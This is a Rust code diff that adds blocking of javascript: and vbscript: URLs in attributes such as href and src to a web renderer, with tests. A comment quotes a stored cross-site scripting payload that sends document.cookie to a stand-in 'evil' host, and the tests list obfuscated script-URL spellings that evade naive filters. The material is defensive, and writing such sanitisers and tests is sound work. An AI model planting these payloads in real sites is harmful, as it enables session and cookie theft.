@@ -237,6 +237,93 @@ pub fn boolean_attribute_form(attribute_name: &str) -> BooleanAttributeForm {
     BooleanAttributeForm::Bare
 }
 
+// ── ALB-03 · URL-valued attributes ──────────────────────────────────────────
+//
+// 🔴 2026-10-27: every renderer emitted `href={user.website}` verbatim, so a
+// stored `javascript:fetch('//evil/?c='+document.cookie)` ran on click — and
+// with `__ALBEDO_CSRF__` readable on the page, the script could call every
+// action as the victim. React 19 blocks these; nothing here did. The rule now
+// lives in this table beside the others, for the same reason they do: six sites
+// write attribute values (three server renderers, three client sinks), and one
+// of them missing it is the whole hole.
+
+/// Attributes whose value the browser follows or fetches as a URL — where a
+/// `javascript:` URL runs. Lowercase; compared case-insensitively.
+pub const URL_ATTRIBUTES: &[&str] = &[
+    "action",
+    "cite",
+    "data",
+    "formaction",
+    "href",
+    "poster",
+    "src",
+    "xlink:href",
+];
+
+/// What replaces a script URL. React 19's choice, kept so a component that moves
+/// here from React behaves the same: the attribute stays, following it runs
+/// nothing but a throw, and the console says why.
+pub const BLOCKED_URL: &str =
+    "javascript:throw new Error('ALBEDO blocked a javascript: URL as a security precaution.')";
+
+/// Is `attribute_name` one of [`URL_ATTRIBUTES`]?
+#[must_use]
+pub fn is_url_attribute(attribute_name: &str) -> bool {
+    URL_ATTRIBUTES
+        .iter()
+        .any(|url| url.eq_ignore_ascii_case(attribute_name))
+}
+
+/// Would a browser run `value` as script if it followed it as a URL?
+///
+/// The URL parser's own normalisation rather than a substring search: it drops
+/// leading C0 controls and spaces, deletes every tab and newline wherever it
+/// sits, and compares the scheme case-insensitively — so ` JaVa\tScRiPt:` is
+/// `javascript:`. An entity like `&#106;` cannot sneak a letter in, because the
+/// value is attribute-escaped after this and `&` ships as `&amp;`.
+#[must_use]
+pub fn is_script_url(value: &str) -> bool {
+    let scheme: String = value
+        .trim_start_matches(|c: char| c <= ' ')
+        .chars()
+        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
+        .take("javascript:".len())
+        .map(|c| c.to_ascii_lowercase())
+        .collect();
+    scheme == "javascript:" || scheme.starts_with("vbscript:")
+}
+
+/// The value to emit for `attribute_name`: `value`, or [`BLOCKED_URL`] when the
+/// attribute is a URL and the value would run as script.
+#[must_use]
+pub fn safe_attribute_value<'a>(attribute_name: &str, value: &'a str) -> &'a str {
+    if is_url_attribute(attribute_name) && is_script_url(value) {
+        BLOCKED_URL
+    } else {
+        value
+    }
+}
+
+/// [`is_script_url`] + [`BLOCKED_URL`] as a JavaScript function expression
+/// `function(v){…}` returning the string to emit, for the renderers that run JS:
+/// the QuickJS `h` shim and the list templater's row thunks.
+///
+/// Regex-free on purpose: some of this code is inlined raw into a classic
+/// `<script>`, where the inline-script escaper's `</` rewrite can corrupt a regex
+/// literal. The client assets carry a hand-written copy of the same loop.
+#[must_use]
+pub fn safe_url_js() -> String {
+    format!(
+        "function(v){{var s=String(v),i=0,t='';\
+         while(i<s.length&&s.charCodeAt(i)<=32)i++;\
+         for(;i<s.length&&t.length<11;i++){{var c=s.charAt(i);\
+         if(c==='\\t'||c==='\\n'||c==='\\r')continue;\
+         t+=(c>='A'&&c<='Z')?String.fromCharCode(c.charCodeAt(0)+32):c;}}\
+         return (t==='javascript:'||t.slice(0,9)==='vbscript:')?{blocked}:s;}}",
+        blocked = serde_json::to_string(BLOCKED_URL).expect("a string serializes"),
+    )
+}
+
 /// The QuickJS-side lookup, generated from [`JSX_ATTRIBUTE_RENAMES`].
 ///
 /// Installs `globalThis.__albedo_attr_name`, which the `h` shim's attribute loop
@@ -256,6 +343,10 @@ pub fn build_jsx_attribute_table_script() -> String {
     for attribute in ENUMERATED_BOOLEAN_ATTRIBUTES {
         enumerated.push_str(&format!("  '{attribute}': true,\n"));
     }
+    let mut url_attributes = String::new();
+    for attribute in URL_ATTRIBUTES {
+        url_attributes.push_str(&format!("  '{attribute}': true,\n"));
+    }
     format!(
         "(function() {{\n\
          if (globalThis.__albedo_attr_name) {{ return; }}\n\
@@ -270,8 +361,14 @@ pub fn build_jsx_attribute_table_script() -> String {
          \x20 return lower.slice(0, {aria_len}) === '{ARIA_PREFIX}'\n\
          \x20   || own.call(enumeratedBooleans, lower);\n\
          }};\n\
+         var urlAttributes = {{\n{url_attributes}}};\n\
+         var safeUrl = {safe_url};\n\
+         globalThis.__albedo_attr_value = function(name, value) {{\n\
+         \x20 return own.call(urlAttributes, String(name).toLowerCase()) ? safeUrl(value) : value;\n\
+         }};\n\
          }})();\n",
-        aria_len = ARIA_PREFIX.len()
+        aria_len = ARIA_PREFIX.len(),
+        safe_url = safe_url_js(),
     )
 }
 
@@ -562,5 +659,92 @@ mod tests {
             script.contains(&format!("=== '{ARIA_PREFIX}'")),
             "the generated table must carry the aria prefix rule, not just the list"
         );
+    }
+
+    /// ALB-03 · every spelling the URL parser normalises to a script scheme.
+    pub(crate) const SCRIPT_URLS: &[&str] = &[
+        "javascript:alert(1)",
+        " JaVaScRiPt:alert(1)",
+        "java\tscript:alert(1)",
+        "jav\nascr\ript:alert(1)",
+        "\u{0}\u{1f} javascript:alert(1)",
+        "\njavascript:alert(1)",
+        "VBScript:msgbox(1)",
+    ];
+
+    /// …and values that only look like one.
+    pub(crate) const SAFE_URLS: &[&str] = &[
+        "https://example.com/?q=javascript:",
+        "/relative/javascript:alert(1)",
+        "javascript",
+        "&#106;avascript:alert(1)",
+        "mailto:ada@example.com",
+        "",
+        "jаvascript:alert(1)", // a Cyrillic `а`: not a scheme the parser accepts
+    ];
+
+    #[test]
+    fn script_urls_are_replaced_in_url_attributes_only() {
+        for url in SCRIPT_URLS {
+            assert!(is_script_url(url), "{url:?} runs as script");
+            for attribute in ["href", "HREF", "src", "action", "formaction", "xlink:href"] {
+                assert_eq!(safe_attribute_value(attribute, url), BLOCKED_URL, "{attribute}={url:?}");
+            }
+            assert_eq!(safe_attribute_value("title", url), *url, "title is text, not a URL");
+        }
+        for url in SAFE_URLS {
+            assert!(!is_script_url(url), "{url:?} must pass unchanged");
+            assert_eq!(safe_attribute_value("href", url), *url);
+        }
+        assert!(is_script_url(BLOCKED_URL), "replacing twice is a no-op");
+        assert_eq!(safe_attribute_value("href", BLOCKED_URL), BLOCKED_URL);
+    }
+
+    /// The two hand-written browser copies of [`URL_ATTRIBUTES`] and
+    /// [`BLOCKED_URL`], read out of the assets the way the rename table is.
+    #[test]
+    fn the_client_url_rule_matches_this_one() {
+        let assets = [
+            (
+                "albedo-client.js",
+                include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/assets/albedo-client.js")),
+                "var URL_ATTRIBUTES = {",
+            ),
+            (
+                "albedo-runtime.js",
+                include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/assets/albedo-runtime.js")),
+                "const URL_ATTRIBUTES = {",
+            ),
+        ];
+        let expected: BTreeSet<String> = URL_ATTRIBUTES.iter().map(|a| (*a).to_string()).collect();
+        for (name, source, marker) in assets {
+            let start = source
+                .find(marker)
+                .unwrap_or_else(|| panic!("{name} must declare URL_ATTRIBUTES"));
+            let body = &source[start..];
+            let body = &body[..body.find("};").expect("the table must be closed")];
+            let found: BTreeSet<String> = body
+                .lines()
+                .skip(1)
+                // The LAST colon: `'xlink:href': true` has one inside the key.
+                .filter_map(|line| line.trim().rsplit_once(':'))
+                .map(|(key, _)| key.trim().trim_matches('\'').trim_matches('"').to_string())
+                .collect();
+            assert_eq!(found, expected, "{name}'s URL_ATTRIBUTES has drifted");
+            assert!(
+                source.contains(&format!("BLOCKED_URL = {};", serde_json::to_string(BLOCKED_URL).unwrap())),
+                "{name}'s BLOCKED_URL has drifted from the server's"
+            );
+        }
+    }
+
+    #[test]
+    fn the_generated_script_carries_the_url_rule() {
+        let script = build_jsx_attribute_table_script();
+        for attribute in URL_ATTRIBUTES {
+            assert!(script.contains(&format!("'{attribute}': true")), "{attribute}");
+        }
+        assert!(script.contains("__albedo_attr_value"));
+        assert!(!script.contains("</"), "inlined raw into a <script>, it must not close one");
     }
 }
